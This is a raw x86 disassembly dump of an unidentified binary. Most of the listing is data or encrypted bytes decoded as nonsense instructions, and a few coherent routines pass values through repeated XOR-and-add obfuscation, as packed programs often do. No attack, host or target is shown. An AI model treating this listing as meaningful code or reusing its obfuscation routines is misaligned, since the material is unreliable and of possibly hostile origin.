  4091dc:	jmp    0x198416eb
  4091e1:	(bad)  [edi]
  4091e3:	pop    ecx
  4091e4:	rcl    DWORD PTR [edi+0x71404f9c],cl
  4091ea:	popf   
  4091eb:	and    ah,bh
  4091ed:	lods   eax,DWORD PTR ds:[esi]
  4091ee:	sbb    eax,0x4a5cb7c1
  4091f3:	cld    
  4091f4:	jne    0x40918e
  4091f6:	icebp  
  4091f7:	adc    al,0x2a
  4091f9:	push   edx
  4091fa:	aam    0xbc
  4091fc:	and    dh,BYTE PTR [ebp+0xe]
  4091ff:	dec    edi
  409200:	mov    ebx,0x96839584
  409205:	jl     0x409277
  409207:	fidiv  WORD PTR [ebx+edx*1+0x981c48d]
  40920e:	aaa    
  40920f:	cld    
  409210:	pop    ds
  409211:	cmp    ebp,eax
  409213:	xchg   DWORD PTR [ebx+0x5d],edi
  409216:	mov    esp,0x3b64e282
  40921b:	in     al,0xf9
  40921d:	les    edi,FWORD PTR [edx+0x9376c08]
  409223:	les    edx,FWORD PTR [di-0x31b3]
  409228:	xor    ebp,DWORD PTR [esi]
  40922a:	mov    ecx,0x6cf31cff
  40922f:	xchg   ebp,eax
  409230:	push   edi
  409231:	mov    esi,0x79256bf9
  409236:	xor    eax,0x5774ab1
  40923b:	cmc    
  40923c:	or     ah,ah
  40923e:	mov    WORD PTR [esi+0x2e390e7b],fs
  409244:	push   0xdf51abb3
  409249:	push   edi
  40924a:	sbb    esp,esp
  40924c:	adc    BYTE PTR [ecx+esi*1],cl
  40924f:	repnz (bad) 
  409251:	hlt    
  409252:	or     al,0x33
  409254:	cmp    edx,ebp
  409256:	xor    eax,esi
  409258:	add    eax,ebx
  40925a:	mov    DWORD PTR [ebp-0x54],eax
  40925d:	lea    eax,[ebp-0x1c]
  409260:	mov    DWORD PTR [ebp-0x50],eax
  409263:	mov    eax,DWORD PTR [ebp-0x60]
  409266:	xor    eax,esi
  409268:	add    eax,ebx
  40926a:	mov    DWORD PTR [ebp-0x60],eax
  40926d:	lea    eax,[ebp-0x60]
  409270:	push   eax
  409271:	mov    eax,DWORD PTR [ebp+0xc]
  409274:	xor    eax,esi
  409276:	add    eax,ebx
  409278:	push   eax
  409279:	mov    eax,ds:0x414b1e
  40927e:	push   0x414a74
  409283:	push   DWORD PTR [eax]
  409285:	call   0x411333
  40928a:	jmp    0x4092c1
  40928f:	cmp    edi,0x13c
  409295:	jne    0x4092c1
  40929b:	mov    eax,DWORD PTR [ebp-0x10]
  40929e:	xor    eax,esi
  4092a0:	add    eax,ebx
  4092a2:	mov    DWORD PTR [ebp+0x8],eax
  4092a5:	mov    eax,ds:0x414afe
  4092aa:	mov    DWORD PTR [ebp+0x8],eax
  4092ad:	mov    eax,DWORD PTR [ebp-0x14]
  4092b0:	mov    DWORD PTR [ebp-0x4],eax
  4092b3:	mov    eax,DWORD PTR [ebp-0x4]
  4092b6:	push   0x4
  4092b8:	pop    ecx
  4092b9:	sub    ecx,eax
  4092bb:	add    ecx,DWORD PTR [ebp-0x18]
  4092be:	mov    DWORD PTR [ebp-0x8],ecx
  4092c1:	mov    eax,DWORD PTR [ebp+0xc]
  4092c4:	xor    eax,esi
  4092c6:	lea    edi,[edi+eax*1+0x327299]
  4092cd:	cmp    edi,0x50a
  4092d3:	jne    0x4089c6
  4092d9:	mov    eax,DWORD PTR [ebp+0xc]
  4092dc:	pop    edi
  4092dd:	xor    eax,esi
  4092df:	pop    esi
  4092e0:	add    eax,ebx
  4092e2:	pop    ebx
  4092e3:	leave  
  4092e4:	ret    0x8
  4092e7:	push   ebp
  4092e8:	mov    ebp,esp
  4092ea:	sub    esp,0x44
  4092ed:	push   edi
  4092ee:	adc    DWORD PTR ds:0x4346b7,ebx
  4092f4:	mov    eax,DWORD PTR [ebp+0xc]
  4092f7:	mov    DWORD PTR [ebp-0x10],eax
  4092fa:	and    DWORD PTR ds:0x4346bb,0x5787
  409304:	jmp    0x40971b
  409309:	jns    0x4092bd
  40930b:	out    dx,al
  40930c:	std    
  40930d:	jge    0x40938c
  40930f:	or     eax,0x11d61472
  409314:	clc    
  409315:	sub    ecx,DWORD PTR [edi-0x1d6d27bf]
  40931b:	jle    0x40939b
  40931d:	jo     0x409398
  40931f:	jle    0x40939f
  409321:	mov    cs,WORD PTR [edx-0x4f57c203]
  409327:	jo     0x40937a
  409329:	aas    
  40932a:	add    al,0x41
  40932c:	out    0xe5,eax
  40932e:	(bad)  
  40932f:	test   eax,0x534639d6
  409334:	dec    ebx
  409335:	frstor [ecx]
  409337:	and    DWORD PTR [eax+0x4adbbd1],eax
  40933d:	mov    al,0x6
  40933f:	add    DWORD PTR [eax+esi*1-0x70],0xd823fc51
  409347:	lock xchg ebx,eax
  409349:	ins    BYTE PTR es:[edi],dx
  40934a:	dec    edi
  40934b:	out    0x26,al
  40934d:	jmp    0x40939d
  40934f:	scas   al,BYTE PTR es:[edi]
  409350:	inc    esp
  409351:	in     eax,dx
  409352:	and    BYTE PTR [eax],al
  409354:	pop    ebp
  409355:	out    0xdb,eax
  409357:	rcl    DWORD PTR [esi+0x6cc7cf9a],1
  40935d:	push   edi
  40935e:	cdq    
  40935f:	in     eax,dx
  409360:	data16 js 0x409323
  409363:	les    ecx,FWORD PTR [esi+0x55]
  409366:	or     eax,DWORD PTR [ebp+0x5893e96d]
  40936c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40936d:	test   eax,0x9737ebcd
  409372:	fcom   QWORD PTR [ecx]
  409374:	cld    
  409375:	xchg   ecx,eax
  409376:	in     eax,0x3e
  409378:	cmp    DWORD PTR [edi+0x6ae10a2a],0x92b0306
  409382:	stos   DWORD PTR es:[edi],eax
  409383:	xor    al,0xb0
  409385:	inc    esi
  409386:	mov    bh,0xef
  409388:	ud1    esp,DWORD PTR [eax]
  40938b:	jb     0x4093be
  40938d:	and    eax,0x3a3db2ac
  409392:	cmp    DWORD PTR [eax+0x25e87579],0x3c3d065b
  40939c:	and    eax,DWORD PTR [ecx+0x208a4159]
  4093a2:	es cmp cl,dl
  4093a5:	loop   0x40937c
  4093a7:	mov    ch,0x30
  4093a9:	dec    ebp
  4093aa:	aaa    
  4093ab:	les    eax,FWORD PTR [esi+0x57184a95]
  4093b1:	xor    eax,0xa99605fc
  4093b6:	xor    ebx,ecx
  4093b8:	dec    ecx
  4093b9:	lock jp 0x409420
  4093bc:	dec    ebp
  4093bd:	push   0xffffff9d
  4093bf:	retf   0x7bb1
  4093c2:	xor    ebp,esp
  4093c4:	and    al,0x6b
  4093c6:	aam    0x6d
  4093c8:	rol    edx,0x38
  4093cb:	lods   al,BYTE PTR ds:[esi]
  4093cc:	inc    edi
  4093cd:	jae    0x409359
  4093cf:	mov    dh,0x23
  4093d1:	and    eax,DWORD PTR [edi+0x6f0f7bf9]
  4093d7:	or     BYTE PTR [esi],0x33
  4093da:	adc    eax,0xf717ced8
  4093df:	fwait
  4093e0:	add    al,0x1b
  4093e2:	and    ch,BYTE PTR [edx]
  4093e4:	fidiv  DWORD PTR [ebp-0x61]
  4093e7:	sub    eax,0x49100114
  4093ec:	in     eax,dx
  4093ed:	aam    0xa
  4093ef:	dec    ecx
  4093f0:	out    dx,eax
  4093f1:	cmp    al,0xaa
  4093f3:	inc    ebx
  4093f4:	mov    al,ds:0xac5be39a
  4093f9:	mov    bh,BYTE PTR [edx-0x2a]
  4093fc:	push   esp
  4093fd:	jno    0x409437
  4093ff:	mov    ecx,0x9abe8199
  409404:	(bad)  
  409405:	loopne 0x409424
  409407:	sbb    bh,BYTE PTR [eax]
  409409:	shr    bh,1
  40940b:	and    al,BYTE PTR [edi]
  40940d:	mov    al,ds:0x1769d4c6
  409412:	test   edx,0xf13a2ad2
  409418:	ror    DWORD PTR [eax],cl
  40941a:	cmp    esi,DWORD PTR [ecx+0x5]
  40941d:	fstp   DWORD PTR [edi-0x72102625]
  409423:	and    al,0x74
  409425:	jae    0x409457
  409427:	in     eax,dx
  409428:	fstp   TBYTE PTR [edx-0x146b003e]
  40942e:	test   al,0x4
  409430:	jno    0x4093f3
  409432:	ja     0x4093fb
  409434:	add    dh,BYTE PTR cs:[esi-0x65fc0f3b]
  40943b:	mov    eax,ds:0xbd9ddd87
  409440:	ret    0x84c4
  409443:	mov    ah,0x21
  409445:	repz arpl WORD PTR [eax-0x3f],di
  409449:	jmp    0x224cc38b
  40944e:	out    0xca,al
  409450:	leave  
  409451:	inc    esi
  409452:	pushf  
  409453:	and    al,BYTE PTR [ebp+0x25d7c31]
  409459:	cmc    
  40945a:	adc    BYTE PTR [eax-0x4677a210],ch
  409460:	leave  
  409461:	push   esp
  409462:	pop    ecx
  409463:	pop    esi
  409464:	test   DWORD PTR [edx-0x60],esp
  409467:	cli    
  409468:	test   BYTE PTR [eax],dh
  40946a:	repnz imul edi,DWORD PTR [ebx+edi*2],0xffffffb1
  40946f:	(bad)  
  409470:	sbb    BYTE PTR [edi],bl
  409472:	je     0x4093fe
  409474:	aad    0x78
  409476:	or     esi,DWORD PTR [eax-0x4e95aebb]
  40947c:	cwde   
  40947d:	push   0xffffffa1
  40947f:	and    cl,BYTE PTR [edx-0x2ef61701]
  409485:	clc    
  409486:	mov    WORD PTR [esi],gs
  409488:	push   cs
  409489:	push   ebp
  40948a:	inc    esp
  40948b:	jo     0x40945c
  40948d:	dec    ecx
  40948e:	ret    
  40948f:	(bad)  
  409490:	push   0x19a74c3f
  409495:	xchg   ebp,eax
  409496:	pop    esp
  409497:	bndstx [edx],(bad)
  40949a:	pushf  
  40949b:	stos   DWORD PTR es:[edi],eax
  40949c:	aam    0x57
  40949e:	or     al,BYTE PTR [ecx+edx*4]
  4094a1:	fcmovb st,st(3)
  4094a3:	stc    
  4094a4:	in     al,0xf
  4094a6:	mov    eax,0x7f7b89f8
  4094ab:	nop
  4094ac:	xchg   BYTE PTR [ebx+0x77],dl
  4094af:	pushf  
  4094b0:	(bad)  
  4094b1:	mov    ah,0xb1
  4094b3:	cmp    BYTE PTR [edi+0x7f444741],al
  4094b9:	cld    
  4094ba:	and    al,BYTE PTR [ebp-0x22361fc0]
  4094c0:	xchg   ebp,eax
  4094c1:	xlat   BYTE PTR ds:[ebx]
  4094c2:	mov    ch,0x41
  4094c4:	sub    edx,ecx
  4094c6:	sub    DWORD PTR [ecx+edx*4-0x58],ebp
  4094ca:	repnz ror BYTE PTR [ebp-0x5696294],0xab
  4094d2:	in     al,dx
  4094d3:	mov    ecx,0x3d7724bf
  4094d8:	dec    edx
  4094d9:	retf   0x691b
  4094dc:	imul   ecx,DWORD PTR [edx-0x5e0619f4],0x203392b3
  4094e6:	neg    BYTE PTR [ebp+0x52]
  4094e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094ea:	dec    esp
  4094eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094ec:	sub    edx,DWORD PTR [ecx+0x76]
  4094ef:	rcr    bl,1
  4094f1:	push   ebx
  4094f2:	call   0xd4de15f0
  4094f7:	sahf   
  4094f8:	xor    dh,BYTE PTR [esi]
  4094fa:	jle    0x4094b2
  4094fc:	adc    al,0x37
  4094fe:	mov    al,ah
  409500:	dec    esi
  409501:	sbb    al,BYTE PTR [edi]
  409503:	out    dx,al
  409504:	int3   
  409505:	adc    al,0x43
  409507:	add    ecx,eax
  409509:	mov    dl,0x83
  40950b:	xchg   ebp,eax
  40950c:	mov    ebp,0x679e456d
  409511:	dec    ecx
  409512:	or     eax,0x62615326
  409517:	mov    dh,0x84
  409519:	jl     0x4094d3
  40951b:	push   edi
  40951c:	push   esi
  40951d:	push   eax
  40951e:	mov    esp,0xc089ca4e
  409523:	inc    edx
  409524:	sti    
  409525:	icebp  
  409526:	loop   0x409516
  409528:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409529:	adc    al,0x13
  40952b:	inc    ebp
  40952c:	fsubp  st(1),st
  40952e:	(bad)  
  40952f:	pop    ss
  409530:	test   BYTE PTR [ebp-0x24],dl
  409533:	ret    0x1462
  409536:	xor    al,0xd8
  409538:	add    BYTE PTR [edi-0x530ff972],al
  40953e:	sbb    BYTE PTR [edi],0x61
  409541:	adc    ebp,ecx
  409543:	(bad)  
  409544:	sbb    DWORD PTR [edx+0x26],esi
  409547:	(bad)  
  409548:	ja     0x409571
  40954a:	push   ebp
  40954b:	pushf  
  40954c:	pop    eax
  40954d:	sub    edx,DWORD PTR [edx-0x29]
  409550:	jns    0x409557
  409552:	out    0xd7,eax
  409554:	daa    
  409555:	mov    ebx,edi
  409557:	or     al,0x14
  409559:	outs   dx,BYTE PTR ds:[esi]
  40955a:	pop    ds
  40955b:	adc    bh,BYTE PTR [edi+0x43f2c374]
  409561:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409563:	ja     0x409544
  409565:	test   BYTE PTR [ecx-0x27ed309f],dh
  40956b:	mov    dh,0xf
  40956d:	jg     0x409520
  40956f:	mov    gs,WORD PTR [edi]
  409571:	clc    
  409572:	mov    DWORD PTR [edi+0x6b96102d],ebp
  409578:	out    0xc3,eax
  40957a:	test   DWORD PTR [ebx-0xf92adde],0x5595e03e
  409584:	mov    eax,0x8c9433f6
  409589:	mov    eax,ds:0x267fa7ab
  40958e:	cmp    BYTE PTR [esi+ecx*2+0xedeed2d],bl
  409595:	dec    DWORD PTR [edi-0x2f0195f4]
  40959b:	fnsave [ebp-0x56]
  40959e:	sbb    ah,BYTE PTR [edi+0x1a]
  4095a1:	dec    ecx
  4095a2:	jae    0x409542
  4095a4:	(bad)  
  4095a5:	outs   dx,BYTE PTR ds:[esi]
  4095a6:	not    DWORD PTR [edi-0x50]
  4095a9:	dec    esp
  4095aa:	aas    
  4095ab:	xchg   ebx,eax
  4095ac:	mov    edi,?
  4095ae:	fsub   st,st(0)
  4095b0:	scas   eax,DWORD PTR es:[edi]
  4095b1:	test   BYTE PTR [edx+0x18],0x76
  4095b5:	sbb    DWORD PTR [esi+0x4e],ecx
  4095b8:	fstp   QWORD PTR [ebx]
  4095ba:	aaa    
  4095bb:	push   ds
  4095bc:	jmp    0x7bc6218
  4095c1:	int    0x10
  4095c3:	or     dh,BYTE PTR [esi]
  4095c5:	push   0x8438cc4e
  4095ca:	rcl    BYTE PTR ds:0x2032fa7,1
  4095d0:	arpl   si,bp
  4095d2:	jne    0x409564
  4095d4:	xlat   BYTE PTR ds:[ebx]
  4095d5:	ret    0x435c
  4095d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095d9:	add    al,0x79
  4095db:	neg    edx
  4095dd:	xor    edi,ebp
  4095df:	retf   0xf71f
  4095e2:	or     BYTE PTR [esi],cl
  4095e4:	cmp    dl,bh
  4095e6:	aam    0xf2
  4095e8:	mov    DWORD PTR [esi+ebp*2-0x3b14d8a7],esi
  4095ef:	in     eax,0x3a
  4095f1:	jecxz  0x4095c3
  4095f3:	jmp    0x8d46:0xe55f42b3
  4095fa:	inc    ebp
  4095fb:	push   ebx
  4095fc:	repnz dec ebx
  4095fe:	ss push edi
  409600:	inc    edx
  409601:	sbb    eax,0xbf7fe877
  409606:	push   edx
  409607:	mov    edi,0x26a484b5
  40960c:	mov    DWORD PTR [edi-0x4ebf8a8],edi
  409612:	inc    ebp
  409613:	cld    
  409614:	int3   
  409615:	adc    eax,0x8ee873cb
  40961a:	div    BYTE PTR [eax-0x1e]
  40961d:	(bad)  [ecx-0xd5ec0d3]
  409623:	loopne 0x4095ea
  409625:	jnp    0x4095d1
  409627:	or     cl,BYTE PTR [ecx+0x35d69842]
  40962d:	mov    bh,0x13
  40962f:	push   ebx
  409630:	lock sahf 
  409632:	xchg   esi,eax
  409633:	pop    ebp
  409634:	inc    eax
  409635:	cmp    DWORD PTR [ebp+0x12af8ed5],eax
  40963b:	sub    eax,DWORD PTR [esi-0x7d570455]
  409641:	jecxz  0x40969e
  409643:	and    eax,0x1aceffc0
  409648:	sub    dl,BYTE PTR [esi-0x1f]
  40964b:	mov    WORD PTR [ebx-0xdddfbeb],es
  409651:	lods   al,BYTE PTR ds:[esi]
  409652:	nop
  409653:	test   BYTE PTR [ebp-0x46],ah
  409656:	mov    eax,0x7fc7d706
  40965b:	adc    esp,DWORD PTR [ebx+0x67]
  40965e:	rcr    BYTE PTR [edx+0x371a261e],cl
  409664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409665:	lea    ecx,[ebp-0x1d0f8dc]
  40966b:	pusha  
  40966c:	fimul  WORD PTR [eax-0x3991c950]
  409672:	mov    eax,ds:0xafd9aa9d
  409677:	jecxz  0x40961d
  409679:	das    
  40967a:	out    0xf1,al
  40967c:	loopne 0x4096d9
  40967e:	clc    
  40967f:	mov    bh,0xa5
  409681:	test   eax,0xf81fdde7
  409686:	xchg   edi,eax
  409687:	stos   BYTE PTR es:[edi],al
  409688:	xor    ecx,DWORD PTR [eax-0x313a682b]
  40968e:	dec    esi
  40968f:	cmp    edx,ecx
  409691:	push   esi
  409692:	push   esp
  409693:	into   
  409694:	fsub   st,st(3)
  409696:	aas    
  409697:	xchg   edi,eax
  409698:	(bad)
  40969d:	adc    al,0x89
  40969f:	enter  0x6757,0xba
  4096a3:	lea    ebx,[eax+0x4150e525]
  4096a9:	xchg   ebp,eax
  4096aa:	xchg   ecx,eax
  4096ab:	daa    
  4096ac:	bound  edx,QWORD PTR [ecx-0x27]
  4096af:	xor    bh,BYTE PTR [ebx+0x50]
  4096b2:	dec    eax
  4096b3:	fstp   DWORD PTR [ecx-0x73]
  4096b6:	push   0xd
  4096b8:	sbb    edx,0x7a23cbc4
  4096be:	(bad)  
  4096c0:	mov    bh,0x1f
  4096c2:	data16 neg bh
  4096c5:	xchg   edx,eax
  4096c6:	xor    BYTE PTR [ebx-0x77888297],0x69
  4096cd:	jecxz  0x409688
  4096cf:	sbb    al,0xa1
  4096d1:	sbb    DWORD PTR [esi-0x477c65f7],ebx
  4096d7:	xchg   al,al
  4096d9:	sub    DWORD PTR [ebp+0x326139e9],ebp
  4096df:	inc    edx
  4096e0:	out    0x94,al
  4096e2:	popa   
  4096e3:	or     al,ah
  4096e5:	fldenv [ebx-0x78]
  4096e8:	ret    
  4096e9:	pop    esi
  4096ea:	sub    WORD PTR [ecx-0x20],di
  4096ee:	or     al,0x11
  4096f0:	(bad)  
  4096f1:	enter  0x3a51,0xa0
  4096f5:	aaa    
  4096f6:	mov    ds:0x9f53a4f7,eax
  4096fb:	dec    eax
  4096fc:	push   ebp
  4096fd:	push   0x4f
  4096ff:	ins    BYTE PTR es:[edi],dx
  409700:	push   edx
  409701:	sahf   
  409702:	lahf   
  409703:	mov    ecx,0xa882e8d4
  409708:	jl     0x4096c0
  40970a:	mov    al,0x77
  40970c:	out    0x26,al
  40970e:	push   ecx
  40970f:	leave  
  409710:	out    0x54,al
  409712:	loope  0x409788
  409714:	idiv   al
  409716:	rcl    DWORD PTR [esi],1
  409718:	xchg   edi,eax
  409719:	cld    
  40971a:	aas    
  40971b:	mov    eax,DWORD PTR [ebp+0x8]
  40971e:	mov    edi,DWORD PTR ds:0x43478f
  409724:	or     DWORD PTR ds:0x434793,edi
  40972a:	mov    DWORD PTR [ebp+0x8],0xf89c8536
  409731:	xor    edi,0x551
  409737:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40973e:	movzx  ecx,WORD PTR ds:0x434673
  409745:	add    ecx,DWORD PTR ds:0x4346b7
  40974b:	mov    DWORD PTR ds:0x434673,ecx
  409751:	mov    edx,DWORD PTR [ebp+0x8]
  409754:	jmp    0x409b6b
  409759:	jmp    0x409767
  40975b:	or     al,0xd8
  40975d:	std    
  40975e:	fdiv   st,st(3)
  409760:	sbb    eax,0x3c00db39
  409765:	rcr    DWORD PTR ds:[ebp-0x46],1
  409769:	xchg   esp,eax
  40976a:	out    dx,al
  40976b:	jle    0x4097eb
  40976d:	jo     0x4097e8
  40976f:	jle    0x4097ef
  409771:	xchg   esi,eax
  409772:	sub    bl,BYTE PTR [ecx]
  409774:	mov    edx,0x5e3b12fb
  409779:	scas   eax,DWORD PTR es:[edi]
  40977a:	scas   al,BYTE PTR es:[edi]
  40977b:	cs push 0xdcab1cff
  409781:	outs   dx,BYTE PTR ds:[esi]
  409782:	das    
  409783:	dec    edi
  409784:	push   0xfffffff9
  409786:	mov    DWORD PTR [esp+ebp*1-0x2f],edi
  40978a:	cdq    
  40978b:	jne    0x409775
  40978d:	pop    ds
  40978e:	dec    edi
  40978f:	jmp    0x67a5794f
  409794:	imul   edi,DWORD PTR [ebx],0xecaa4841
  40979a:	xchg   edx,eax
  40979b:	test   eax,0xdd410a64
  4097a0:	mov    es,WORD PTR [eax+ecx*4-0xa]
  4097a4:	mov    eax,0x4f188070
  4097a9:	adc    esp,DWORD PTR [ebx+0x72]
  4097ac:	jbe    0x4097d9
  4097ae:	xchg   edx,eax
  4097af:	out    dx,eax
  4097b0:	aas    
  4097b1:	xor    DWORD PTR ss:[esi],esi
  4097b4:	inc    edi
  4097b5:	pop    esi
  4097b6:	jmp    0x40978c
  4097b8:	add    BYTE PTR [esi],bl
  4097ba:	add    BYTE PTR ds:0xec3127e0,bl
  4097c0:	and    DWORD PTR [ebx+0x5f23486e],esi
  4097c6:	add    al,0x44
  4097c8:	xor    al,0x1e
  4097ca:	(bad)  
  4097cb:	jae    0x409809
  4097cd:	mov    al,ds:0x46a6d30e
  4097d2:	push   ebp
  4097d3:	pop    ss
  4097d4:	adc    DWORD PTR [eax],esi
  4097d6:	hlt    
  4097d7:	imul   esi,edi,0xca8fc5b9
  4097dd:	int3   
  4097de:	ins    DWORD PTR es:[edi],dx
  4097df:	add    bl,BYTE PTR [ebp+0x2a]
  4097e2:	xchg   esi,eax
  4097e3:	lods   al,BYTE PTR ds:[esi]
  4097e4:	(bad)  
  4097e6:	xchg   DWORD PTR [edi],edx
  4097e8:	test   DWORD PTR [ebp-0x40],ebx
  4097eb:	jle    0x40983f
  4097ed:	xchg   ecx,eax
  4097ee:	ss sbb edx,ebp
  4097f1:	in     al,0x9f
  4097f3:	es sti 
  4097f5:	jle    0x409874
  4097f7:	ss js  0x4097bd
  4097fa:	sar    edi,0x1a
  4097fd:	adc    dh,al
  4097ff:	test   BYTE PTR [eax+0x5238928f],0x1
  409806:	ret    0xd9cc
  409809:	addr16 jmp 0x409807
  40980c:	(bad)  
  40980d:	pop    ecx
  40980e:	shl    edx,cl
  409810:	scas   eax,DWORD PTR es:[edi]
  409811:	sub    ah,BYTE PTR [ebp-0x32]
  409814:	mov    bl,0x13
  409816:	xchg   ebx,eax
  409817:	out    0x78,al
  409819:	xor    DWORD PTR [ecx+0x46],esi
  40981c:	(bad)  
  40981d:	xchg   ecx,eax
  40981e:	inc    esp
  40981f:	or     bh,dh
  409821:	lea    edx,[ebx-0x1dfe4d1b]
  409827:	cmp    ah,0x8d
  40982a:	or     DWORD PTR [ebp+0xb],esi
  40982d:	jle    0x4097e5
  40982f:	rcr    BYTE PTR [esi+ebp*8],cl
  409832:	xlat   BYTE PTR ds:[ebx]
  409833:	jge    0x4098ab
  409835:	ret    0x722e
  409838:	addr16 sbb ebx,edi
  40983b:	mov    ecx,0x4929eeaa
  409840:	mov    cl,0x54
  409842:	cmp    bh,cl
  409844:	adc    esp,esi
  409846:	inc    eax
  409847:	pop    ss
  409848:	ds iret 
  40984a:	mov    ds:0x8148c4c4,al
  40984f:	pop    eax
  409850:	jae    0x409882
  409852:	jmp    0x76aa:0xc9a13f61
  409859:	aaa    
  40985a:	jbe    0x4097e8
  40985c:	(bad)  [ecx]
  40985e:	mov    bl,0x11
  409860:	imul   edi,DWORD PTR [edi+ecx*1-0x5206d116],0xcf73084
  40986b:	mov    dl,0xa5
  40986d:	retf   
  40986e:	lods   al,BYTE PTR ds:[esi]
  40986f:	cli    
  409870:	sbb    BYTE PTR [ecx+0x7872ce0f],ah
  409876:	sub    ebx,DWORD PTR ds:0xa72f98d4
  40987c:	sbb    ebx,DWORD PTR [edi-0x541818f4]
  409882:	(bad)  
  409883:	mov    DWORD PTR [edx],ecx
  409885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409886:	fcomp  DWORD PTR [ebp-0xc]
  409889:	ss push ds
  40988b:	cmp    edx,0x6df30d88
  409891:	mov    dl,0x25
  409893:	push   es
  409894:	shl    DWORD PTR [ebp+0x3920d63a],cl
  40989a:	sbb    DWORD PTR [eax+0x38],edi
  40989d:	(bad)  
  40989f:	mov    al,0x86
  4098a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098a3:	sub    ebp,ebx
  4098a5:	out    dx,al
  4098a6:	mov    ebp,0x2f12b6b2
  4098ab:	test   al,0x7f
  4098ad:	pushf  
  4098ae:	inc    esp
  4098af:	fnstcw WORD PTR [ebp+esi*2+0x43a9502f]
  4098b6:	fmul   DWORD PTR [esi]
  4098b8:	std    
  4098b9:	add    ecx,DWORD PTR [esi-0x5f532bf]
  4098bf:	out    0x67,eax
  4098c1:	popf   
  4098c2:	push   esi
  4098c3:	popf   
  4098c4:	or     DWORD PTR [ebx+0x24],ebp
  4098c7:	pop    ds
  4098c8:	inc    eax
  4098c9:	call   0x7a5d:0x6f92feb8
  4098d0:	loopne 0x40985a
  4098d2:	dec    ebx
  4098d3:	inc    eax
  4098d4:	mov    bh,0xa4
  4098d6:	inc    edx
  4098d7:	mov    dl,0x88
  4098d9:	(bad)  
  4098da:	cld    
  4098db:	cld    
  4098dc:	mov    eax,edi
  4098de:	das    
  4098df:	add    al,bh
  4098e1:	push   0xcf531c2c
  4098e6:	(bad)  
  4098e8:	dec    eax
  4098e9:	es in  eax,dx
  4098eb:	(bad)  [ebx]
  4098ed:	loop   0x409960
  4098ef:	push   ecx
  4098f0:	lea    ecx,[ebp+0x4c]
  4098f3:	arpl   WORD PTR [eax-0x6fb7eddc],bx
  4098f9:	div    BYTE PTR [edx*8-0x7fd6ecf1]
  409900:	imul   ebx,DWORD PTR [ebx],0x757eb038
  409906:	pop    ss
  409907:	add    al,0xad
  409909:	push   0x9e22923c
  40990e:	scas   al,BYTE PTR es:[edi]
  40990f:	mov    al,ds:0xb2250ecb
  409914:	mov    ah,0x3d
  409916:	pop    ds
  409917:	dec    eax
  409918:	lea    ecx,ds:0x933847e6
  40991e:	fwait
  40991f:	out    0xa2,al
  409921:	add    BYTE PTR [eax+0x57],ah
  409924:	dec    cx
  409926:	je     0x4098dd
  409928:	fcom   QWORD PTR [esi-0x48]
  40992b:	add    ecx,DWORD PTR [ecx]
  40992d:	loopne 0x409917
  40992f:	into   
  409930:	and    BYTE PTR [ebx+0x40f01e4],0x79
  409937:	push   cs
  409938:	inc    BYTE PTR [edx+0x6878093e]
  40993e:	pop    ds
  40993f:	ja     0x4099a7
  409941:	jno    0x4098d8
  409943:	sbb    BYTE PTR [esi+0x196b5ceb],dl
  409949:	inc    ebp
  40994a:	mov    esp,0x3e8a86c6
  40994f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409950:	jl     0x409986
  409952:	or     BYTE PTR [esi-0x44],al
  409955:	mov    eax,0x39939111
  40995a:	xchg   ebp,eax
  40995b:	(bad)  
  40995c:	jbe    0x4098f1
  40995e:	imul   ebp,DWORD PTR [edx],0x3cf05fde
  409964:	jle    0x4099af
  409966:	push   esi
  409967:	les    edx,FWORD PTR [ecx]
  409969:	dec    esp
  40996a:	push   ss
  40996b:	xor    al,0x68
  40996d:	mov    ds:0x4c9f492e,al
  409972:	cmp    BYTE PTR [edx],dh
  409974:	or     DWORD PTR [eax-0x38],esp
  409977:	ror    BYTE PTR [edi+0x4cefe668],1
  40997d:	push   edx
  40997e:	adc    BYTE PTR [edi+eax*1+0x7292aa5e],0x99
  409986:	dec    eax
  409987:	sbb    ch,0x5a
  40998a:	add    BYTE PTR [eax],ah
  40998c:	in     al,0xaa
  40998e:	xlat   BYTE PTR ds:[ebx]
  40998f:	pushf  
  409990:	cli    
  409991:	inc    edi
  409992:	xor    BYTE PTR [ebx],0x43
  409995:	ror    DWORD PTR [edx],0xa0
  409998:	mov    WORD PTR [esi],?
  40999a:	sbb    BYTE PTR [ecx+0x62],ch
  40999d:	cmp    ebp,DWORD PTR [eax+0x43]
  4099a0:	ds lock jae 0x409934
  4099a4:	or     BYTE PTR [ecx-0x641c237e],dh
  4099aa:	pushf  
  4099ab:	jmp    0x2386:0xeb6df233
  4099b2:	clc    
  4099b3:	and    bl,BYTE PTR [ebp-0x652cb1ab]
  4099b9:	add    eax,0x834dd981
  4099be:	sti    
  4099bf:	dec    edi
  4099c0:	cmp    dh,BYTE PTR [edi-0x40]
  4099c3:	rcl    DWORD PTR [ebp+0x1ab69d40],0x7c
  4099ca:	or     ecx,DWORD PTR [eax-0x2e]
  4099cd:	adc    DWORD PTR [ecx],edi
  4099cf:	dec    edi
  4099d0:	xor    eax,0xb0093103
  4099d5:	or     cl,BYTE PTR [eax]
  4099d7:	fdivr  DWORD PTR [esi]
  4099d9:	enter  0x7958,0x22
  4099dd:	sub    ebx,DWORD PTR [ebx]
  4099df:	stos   DWORD PTR es:[edi],eax
  4099e0:	stos   DWORD PTR es:[edi],eax
  4099e1:	(bad)  
  4099e2:	in     al,dx
  4099e3:	xchg   ebx,eax
  4099e4:	test   eax,0x713e5851
  4099e9:	test   DWORD PTR [edx-0x18],0xe524f6f3
  4099f0:	pop    ss
  4099f1:	mov    edi,0x90f9aaa7
  4099f6:	cmp    eax,0xf041aa64
  4099fb:	(bad)  
  4099fc:	in     eax,dx
  4099fd:	shr    DWORD PTR [edi],cl
  4099ff:	jge    0x409997
  409a01:	icebp  
